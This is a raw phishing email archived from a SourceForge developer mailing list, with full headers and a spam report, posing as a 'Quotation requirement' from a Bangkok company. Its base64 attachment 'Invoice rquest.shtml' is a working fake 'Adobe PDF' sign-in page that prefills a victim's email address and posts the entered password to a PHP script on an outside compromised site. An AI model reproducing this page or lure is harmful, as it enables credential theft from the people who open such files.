Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 295CF59B3D0
	for <lists+industrypack-devel@lfdr.de>; Sun, 21 Aug 2022 14:52:47 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1oPkRZ-0003wg-9r
	for lists+industrypack-devel@lfdr.de;
	Sun, 21 Aug 2022 12:52:45 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <info@moliviansales.ml>) id 1oPkRY-0003wa-Kl
 for industrypack-devel@lists.sourceforge.net;
 Sun, 21 Aug 2022 12:52:44 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=c0JKfqfTE+a/tURDRtHqmRAyQAU5jP8v4/uuPyrHGTg=; b=P2dAkGctBaxiKdYJEuKMPJuYuG
 i7G7AXYRleeKHfmSvKeD7sytJ1wrGZpWZaFPs7K01bdHSQhU/ceXV9OgzZ3LnmHIvz60gGvKTDgxR
 iBSWO8AjH95ITpsvIwg9KvYWbqqOm5HPTRVkhFtThKG2eFBR9V+74v2qeFrk7RdVg/Mo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=c0JKfqfTE+a/tURDRtHqmRAyQAU5jP8v4/uuPyrHGTg=; b=X
 m85xnFmTy2BIr6t9iex0J+jyr5QnU27F1OoHTPtUqa5sFB8pby9ktwHXWHOhX6K8USarN1IvQCLZn
 GF2YQIuXukxYn0rUyPSMXZZcuPqxdJ7YZTS5dmAXaVXbvLLV3kVlbaEDaARvTYTLfttOFTVQ3NTJQ
 Ig7QYlf5+Y4BfV9I=;
Received: from [37.139.129.143] (helo=moliviansales.ml)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1oPkRU-00BsZ9-DT for industrypack-devel@lists.sourceforge.net;
 Sun, 21 Aug 2022 12:52:44 +0000
Received: from moliviansales.ml (unknown [154.127.53.189])
 (Authenticated sender: info@moliviansales.ml)
 by moliviansales.ml (Postfix) with ESMTPSA id E30ED10ACF1
 for <industrypack-devel@lists.sourceforge.net>;
 Sun, 21 Aug 2022 08:52:32 -0400 (EDT)
DKIM-Filter: OpenDKIM Filter v2.11.0 moliviansales.ml E30ED10ACF1
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=moliviansales.ml;
 s=default; t=1661086354;
 bh=c0JKfqfTE+a/tURDRtHqmRAyQAU5jP8v4/uuPyrHGTg=;
 h=From:To:Subject:Date:From;
 b=xtnGsQb1dNVzaftJj/IxOGYPsCVRFjXmHBsSz4eheMkWS5FZI8yDG9HC7mwQNstWK
 QC+Xvn48sHuEw3wk7Tb/h1N0SRdaBJevZVO5Or99sJLLes5B23XD5xnUGCZzhDnRZl
 QYR/5sOuhAqBIhO5K4gF2r1cZ9pYzBqATHvzS7sg=
To: industrypack-devel@lists.sourceforge.net
Date: 21 Aug 2022 20:52:32 +0800
Message-ID: <20220821205231.35E1613172549A92@moliviansales.ml>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_B1169347.44895A56"
X-Spam-Score: 5.5 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  industrypack-devel, Find attached our Quotation requirement.
 Awaiting your response once confirmed PO. 
 Content analysis details:   (5.5 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [37.139.129.143 listed in dnsbl-1.uceprotect.net]
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 T_OBFU_HTML_ATTACH     BODY: HTML attachment with non-text MIME type
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [37.139.129.143 listed in bl.score.senderscore.com]
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
X-Headers-End: 1oPkRU-00BsZ9-DT
Subject: [Industrypack-devel] Fwd: Quotation requirement
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: industrypack-devel via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: industrypack-devel <info@moliviansales.ml>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_B1169347.44895A56
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<p>industrypack-devel,<br><br>Find attached our Quotation requirement.</p><=
p>Awaiting your response once confirmed PO.</p><p>Thanks &amp; Best Regards=
,<br>&nbsp;&nbsp; <br>SOMKHID PHIMPHAMOTE<br>Krungthonburi Rd., Klongsarn, =
Bangkok 10600 Thailand<br>Tel. 66 (0)2440-0181-6 Fax. (0) 2440-0206<br>
</p>


</body></html>
------=_NextPart_000_0012_B1169347.44895A56
Content-Type: application/octet-stream; name="Invoice rquest.shtml"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Invoice rquest.shtml"

PEhUTUw+PEhFQUQ+PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0
ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMSI+DQoNCjxTVFlMRSB0eXBlPXRleHQvY3Nz
Pg0KYm9keSwgaHRtbCB7aGVpZ2h0OiAxMDAlO21hcmdpbjogMDsgIGZvbnQtZmFtaWx5OiAi
U2Vnb2UgVUkgV2ViZm9udCIsLWFwcGxlLXN5c3RlbSwiSGVsdmV0aWNhIE5ldWUiLCJMdWNp
ZGEgR3JhbmRlIiwiUm9ib3RvIiwiRWJyaW1hIiwiTmlybWFsYSBVSSIsIkdhZHVnaSIsIlNl
Z29lIFhib3ggU3ltYm9sIiwiU2Vnb2UgVUkgU3ltYm9sIiwiTWVpcnlvIFVJIiwiS2htZXIg
VUkiLCJUdW5nYSIsIkxhbyBVSSIsIlJhYXZpIiwiSXNrb29sYSBQb3RhIiwiTGF0aGEiLCJM
ZWVsYXdhZGVlIiwiTWljcm9zb2Z0IFlhSGVpIFVJIiwiTWljcm9zb2Z0IEpoZW5nSGVpIFVJ
IiwiTWFsZ3VuIEdvdGhpYyIsIkVzdHJhbmdlbG8gRWRlc3NhIiwiTWljcm9zb2Z0IEhpbWFs
YXlhIiwiTWljcm9pbHNvZnQgTmV3IFRhaSBMdWUiLCJNaWNyb3NvZnQgUGhhZ3NQYSIsIk1p
Y3Jvc29mdCBUYWkgTGUiLCJNaWNyb3NvZnQgWWkgQmFpdGkiLCJNb25nb2xpYW4gQmFpdGki
LCJNViBCb2xpIiwiTXlhbm1hciBUZXh0IiwiQ2FtYnJpYSBNYXRoIjt9DQoud3JhcHBlciB7
ICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoaHR0cHM6Ly9jZG4ubWNhdXRvLWltYWdlcy1wcm9k
dWN0aW9uLnNlbmRncmlkLm5ldC8zMjcyNGEwOTJhZDcwMWY3L2M2ZTIyODJkLThhNTMtNDRj
OC05YjdjLTI2MmIyNDc5ZjczMS8xMzY2eDc2OC5qcGcpOyAgYmFja2dyb3VuZC1yZXBlYXQ6
IG5vLXJlcGVhdDsgYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZDsgIGJhY2tncm91bmQt
cG9zaXRpb246IGNlbnRlcjsgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7ICBwb3NpdGlvbjog
Zml4ZWQ7ICB0b3A6IDA7ICBsZWZ0OiAwOyAgaGVpZ2h0OiAxMDAlOyAgd2lkdGg6IDEwMCU7
ICAgZGlzcGxheTogZmxleDsgIGZsZXgtZmxvdzogY29sdW1uIG5vd3JhcDsganVzdGlmeS1j
b250ZW50OiBjZW50ZXI7ICBhbGlnbi1pdGVtczogY2VudGVyOyAgYm94LXNpemluZzogYm9y
ZGVyLWJveDt9DQouZWxlbWVudCB7ICB3aWR0aDogMzIwcHg7ICBoZWlnaHQ6IDMwMHB4OyAg
cGFkZGluZzogNDBweCAzMHB4OyAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsgIGJvcmRl
cjogMXB4IHNvbGlkIGdyZXk7ICBib3JkZXItY29sb3I6ICNiMzBiMDA7fQ0KLmVsZW1lbnRl
ewl3aWR0aDogNDAwcHg7ICBoZWlnaHQ6IDMwMHB4OyAgcGFkZGluZzogNDBweCAzMHB4OyAg
YmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsgIGJvcmRlcjogMXB4IHNvbGlkIGdyZXk7fQ0K
ZGl2IC5zaWduLW9wdCB7CXBhZGRpbmc6IDIwcHggMHB4Owlmb250LXNpemU6IDE0cHg7fQ0K
Lm5ld2J1dHRvbnsJd2lkdGg6IDExMHB4OyBmbG9hdDogbGVmdDsgYm9yZGVyLWNvbG9yOiAj
YjMwYjAwOyBiYWNrZ3JvdW5kLWNvbG9yOiAjYjMwYjAwOyBjb2xvcjogI2ZmZjsgZm9udC1z
aXplOiAxNHB4OyBwYWRkaW5nOiA4cHggMDsgY3Vyc29yOiBwb2ludGVyOyBib3JkZXI6IG5v
bmU7fQ0KPC9TVFlMRT4NCjx0aXRsZT5BZG9iZSBJRDwvdGl0bGU+DQo8bGluayByZWw9InNo
b3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vd3d3LmFkb2JlLmNvbS9jb250ZW50L2RhbS9k
eC1kYy9mYXZpY29ucy9mYXZpY29uLmljbyIgdHlwZT0iaW1hZ2Uvdm5kLm1pY3Jvc29mdC5p
Y29uIj4NCjwvSEVBRD4NCjxCT0RZPg0KPERJViBjbGFzcz13cmFwcGVyPjwhLS0gRml4ZWQg
ZWxlbWVudCB0aGF0IHNwYW5zIHRoZSB2aWV3cG9ydCAtLT4NCjxESVYgaWQ9ZWxlbWVudCBj
bGFzcz1lbGVtZW50Pg0KPEZPUk0gbWV0aG9kPXBvc3QgYWN0aW9uPSJodHRwczovL2VsZW5h
bGFiemluYS5jb20vd3AtaW5jbHVkZXMvdGVtL1BERUxWLnBocCIgYXV0b2NvbXBsZXRlPSIi
PjxwPg0KPERJViBpZD1sb2dvPjxJTUcgYm9yZGVyPTAgYWx0PSIiIHNyYz0iaHR0cHM6Ly9z
dGF0aWMuYWRvYmVsb2dpbi5jb20vY2xpZW50cy92aXJnb3dlYi0yMDIwLzR4XzgxN2NmMTRh
MmYzZmNmZjRlZTZkNGUzNWM1MDI2Nzc5LnBuZyIgY29sb3I9IiNiMzBiMDAiIGFsaWduPSJ0
b3AiIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIvPiA8Yj4gQWRvYmUgUERGPC9iPjwvRElWPjwv
cD48cD4NCjxESVYgaWQ9Y29udCBzdHlsZT0iVEVYVC1BTElHTjogbGVmdDsgUEFERElORy1U
T1A6IDEwcHg7IGZvbnQtc2l6ZToyMHB4OyBjb2xvcjojYjMwYjAwOyIgPlNpZ24gaW4gdG8g
dmlldyBpbnZvaWNlPC9ESVY+PC9wPjxwPg0KDQo8RElWPjxJTlBVVCAgbmFtZT1sb2dpbiBy
ZXF1aXJlZD0icmVxdWlyZWQiIHZhbHVlPSJpdmRfZGVzdHJveWVyQHlhaG9vLmNvbSIgcGxh
Y2Vob2xkZXI9IkVtYWlsIGFkZHJlc3MiIHJlYWRvbmx5IHN0eWxlPSJ3aWR0aDozMjA7IGhl
aWdodDozMDsgYm9yZGVyLWNvbG9yOiAjYjMwYjAwIj48L0RJVj48L3A+DQo8RElWPjxJTlBV
VCB0eXBlPXBhc3N3b3JkIG5hbWU9cGFzc3dkIHJlcXVpcmVkPSJyZXF1aXJlZCIgYXV0b2Zv
Y3VzPSJhdXRvZm9jdXMiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgc3R5bGU9IndpZHRoOjMy
MDsgaGVpZ2h0OjMwOyBib3JkZXItY29sb3I6ICNiMzBiMDAiPjwvRElWPg0KPERJViBpZD1z
aWduLW9wdCBjbGFzcz1zaWduLW9wdD4NCjxESVYgaWQ9bm8tYWNjPjwvQT48L0RJVj4NCjxE
SVYgY2xhc3M9YnV0dG9uPjxBIGhyZWY9IiMiPjxCVVRUT04gaWQ9aTk4Mzg5MyBjbGFzcz1u
ZXdidXR0b24gdHlwZT1zdWJtaXQgbmFtZT1zdWJtaXQ+DQo8Rk9OVCBjb2xvcj0jZmZmPlNp
Z24gaW48L0ZPTlQ+PC9CVVRUT04+PC9BPjwvRElWPg0KPERJViBpZD1zaWduLW91dCBjbGFz
cz1zaWduLW9wdD48QSBocmVmPSIjIj48L0E+PC9ESVY+PC9ESVY+PC9GT1JNPjwvRElWPjwh
LS0geW91ciBhY3R1YWwgY2VudGVyZWQgZWxlbWVudCAtLT48L0RJVj48L0JPRFk+PC9IVE1M
Pg0K

------=_NextPart_000_0012_B1169347.44895A56
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_B1169347.44895A56
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_B1169347.44895A56--


